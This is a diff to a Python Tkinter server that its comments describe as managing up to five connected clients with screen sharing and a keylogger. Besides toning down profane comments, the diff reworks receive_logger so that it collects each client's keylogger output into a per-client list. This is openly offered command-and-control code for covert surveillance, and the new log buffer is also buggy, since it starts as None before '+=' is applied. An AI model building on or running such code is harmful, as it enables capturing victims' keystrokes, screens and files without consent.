@@ -37,6 +37,7 @@ clients = ["No Client Connected"] * 5
 client_labels = [None] * 5
 connectionNumThing = str(connectionsNum) + " Connections!"
 client_sockets = [None] * 5
+logsClient = [None] * 5
 
 
 # ----------------------------------------------------------------
@@ -124,7 +125,7 @@ class ScreenSharingServer:
     # The Literal Brain of the Project
     # This class is responsible for managing the server, accepting new connections, and managing the client sockets.
     # It also manages the screen sharing feature and the keylogger feature.
-    # I couldn't be bothered to write out what each function does, because this class is fucking massive, and has a shit-ton of functions, tbh the functions are named properly so you can infer what they do from their names
+    # I couldn't be bothered to write out what each function does, because this class is fucking massive, and has a crap-ton of functions, tbh the functions are named properly so you can infer what they do from their names
     # ----------------------------------------------------------------
     def __init__(self, master, host="0.0.0.0", port=5001):
         self.master = master
@@ -140,12 +141,13 @@ class ScreenSharingServer:
         self.clients = [None] * 5
         self.client_sockets = [None] * 5
         self.client_labels = [None] * 5
+        self.logsClient = [None] * 5
         self.connectionNumThing = str(connectionsNum) + " Connections!"
         self.current_client = 0
         self.is_screen_sharing = True
         self.client_infos = [{}] * 5
         self.current_info_index = 0
-        self.fuckIt_weBall = False
+        self.screwIt_weBall = False
         # UI elements
         self.canvas = objTK.Canvas(master, bg="black")
         self.canvas.pack(fill=objTK.BOTH, expand=True)
@@ -252,7 +254,7 @@ class ScreenSharingServer:
     # NO this doesn't update the canvas, this RECEIVES the images and gives it to the next function
     def receive_image(self, client_socket, index: int):
         try:
-            while self.fuckIt_weBall is not True:
+            while self.screwIt_weBall is not True:
                 attempts = 0
                 max_attempts = 3
                 size_data = client_socket.recv(4)
@@ -323,24 +325,21 @@ class ScreenSharingServer:
     def receive_logger(self, client_socket, index: int):
         try:
             try:
-                while True:
-                    lenght = 0
-                    digits = client_socket.recv(1).decode("utf-8")
-                    while digits.isdigit():
-                        lenght = lenght * 10 + int(digits)
-                        digits = client_socket.recv(1).decode("utf-8")
-                    break
-                logClient = client_socket.recv(lenght + 5).decode("utf-8")
-                if logClient.startswith("[LOG]"):
-                    trimmedLog = logClient[5:]
-                    print(f"Received log from Client {index}: \n{trimmedLog}")
+                if client_socket.recv(4).decode("utf-8") == "Logg":
+                    logSize = 0
+                    while (
+                        receivedCharaLog := client_socket.recv(1).decode("utf-8")
+                    ).isdigit():
+                        logSize = logSize * 10 + int(receivedCharaLog)
+                    logRecv = client_socket.recv(logSize).decode("utf-8")
+                    self.logsClient[index] += logRecv
             except UnicodeDecodeError:
                 pass
         except (ConnectionError, OSError) as e:
             print(f"Error receiving command: {e}")
             self.handle_client_disconnection(index)
 
-    # File Shit
+    # File crap
     def receive_file(self, client_socket, index: int):
         try:
             tag = client_socket.recv(6)
@@ -546,7 +545,7 @@ try:
     ctypes.windll.shcore.SetProcessDpiAwareness(1)
 except Exception as e:
     print(f"Failed to set DPI awareness: {e}")
-# Tkinter shit
+# Tkinter crap
 root = objTK.Tk()
 root.title("Server Side Control Panel")
 root.geometry("905x610")
@@ -579,7 +578,7 @@ def toggle_theme():
 # Theme
 sv_ttk.set_theme("dark")
 style = objTTK.Style()
-# Some "MAGICAL SHIT" with the button and tab styles
+# Some "MAGICAL crap" with the button and tab styles
 style.configure("TButton", font=lightFont)
 style.map("TButton", font=[("disabled", ("Montserrat", 10, "bold"))])
 style.layout(
@@ -747,7 +746,7 @@ def apply_focus_style():
 # Call Function
 apply_theme_to_titlebar(root)
 apply_focus_style()
-# Add shit to the tabs
+# Add crap to the tabs
 # Home Tab
 themeLabel = objTTK.Label(
     objHomeTab, text="Toggle between Light and Dark theme:", font=normalFont
